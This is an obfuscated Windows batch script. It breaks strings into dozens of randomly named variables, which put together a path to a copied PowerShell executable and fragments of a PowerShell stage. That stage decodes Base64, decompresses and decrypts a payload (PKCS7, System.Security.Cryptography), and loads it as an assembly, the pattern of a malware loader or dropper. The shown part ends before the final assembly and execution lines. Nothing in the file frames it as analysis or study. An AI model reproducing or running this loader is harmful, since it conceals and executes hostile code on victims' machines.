@echo off
set "qekDdojEFs= C"
set "qZqEDPeZsG=rS"
set "IiKnBnzyLQ=ws"
set "DNpQCFmaKC=:\"
set "QgmnziCZRX=\v"
set "POsXfACeLA=s\"
set "WVmZezQuNP=0\"
set "jVziwSwtlx=we"
set "HCGTZxqvwh=1."
set "hBiJQpyrFE=po"
set "hTDuNLCYAv=Po"
set "rhlcPfuXcK=he"
set "yPCfRDFrjN=Wi"
set "GNIeXRBiGL=em"
set "xnfJMUUniZ=rs"
set "oAxusUwzXV=.e"
set "tRjWRNICRI=ll"
set "MWJjEQkpWt=we"
set "APSurskucE=32"
set "JRuSLJHDFz=Sy"
set "rtnjthKIEl=\W"
set "iehZptjShR=co"
set "GUfMldUEVa=nd"
set "kFnOnZWSJe=ow"
set "LIeJsTCNRS=st"
set "hzWUYVQKra=do"
set "wnnmtyxnnL= /"
set "wLEeMoVBhm=he"
set "ukjFmEKHty=xe"
set "MmJlKcPczE=py"
set "ZYPSvalcuo=ll"
set "XOnTUVjpUU=in"
set "JSTUKRJRJV=y "
set "FkgqNhpvlk=cd"
set "BQQgstmlRw= %~dp0"
set "tHLddHizFS=Fina"
set "pxVgtlUeBJ=7;$Z"
set "agHDGYYQuX=:('g"
set "hiXkWNrHUI=Secu"
set "ofLbsVDPUr=);$Z"
set "JzIBculFca=yste"
set "fePjTRVJmT=ing("
set "hVtllilkXp=ach "
set "ulEsRxAXqb=('Tg"
set "LNgckZUOwH=$JuZ"
set "ZSLWCeGUxF=6esa"
set "mfhULPYVTi=[-1."
set "xaugXkXKRa= [st"
set "qnycJnoiMe=-joi"
set "pSPcZrhNJe=]::("
set "jzVqBYNUVV=6] -"
set "GIpjaWSxsW=V = "
set "ipAPTdEVqK=.IO."
set "ntahtwDDQQ=.Cry"
set "nbauRbMbTZ=:: '"
set "TtbRHokLMs=.Ass"
set "tbMVvRCGQs=L4Yi"
set "DdsrHqqrow=rtS4"
set "idJSxTLtib=rt]:"
set "oPtdqcyvfj=Secu"
set "YSXNwdodtA=le  "
set "XiLekQVuyt=m = "
set "EcXLwqAxQB=daeR"
set "SJNYUjadKY=vm ="
set "pliLJxEBqL=S46e"
set "zGSrjGkhSO=FqC."
set "RfkgGXwyRP=sion"
set "AZRLVwivEo=rofi"
set "ENknDPsmCV=();$"
set "nGDLqZBxLd=ss -"
set "ZtaTNRkAIi=raph"
set "qrfrFSrHrc=lBlo"
set "MUtuHAnywb=();$"
set "tPLJoewkmX=$HIJ"
set "NDKveSKVxA=se()"
set "WOEjZHpYeP=106u"
set "sLIdIIpbFe=grap"
set "FnyHXuMsCE=3); "
set "maXzJcVBTM=)) {"
set "tfmtKxlSTP=PKCS"
set "ozytEZIBqT=Mode"
set "rSjkqJmyeu=tem."
set "zzKtDwStLf=tryP"
set "STMWoHMEKE=OghT"
set "LejMMSMbkD=fore"
set "NxvlkrctrD=SS ="
set "vNwyzHuBFy=-Obj"
set "tIBodagLxb=RmAx"
set "QzDZCBOHuM= '')"
set "lbiBBtJnkt=pres"
set "AgfOWTpTOE=Invo"
set "tIudKfBmYP=.Cry"
set "hXtadHIuyT=Conv"
set "uxAIcICNWr=.-16"
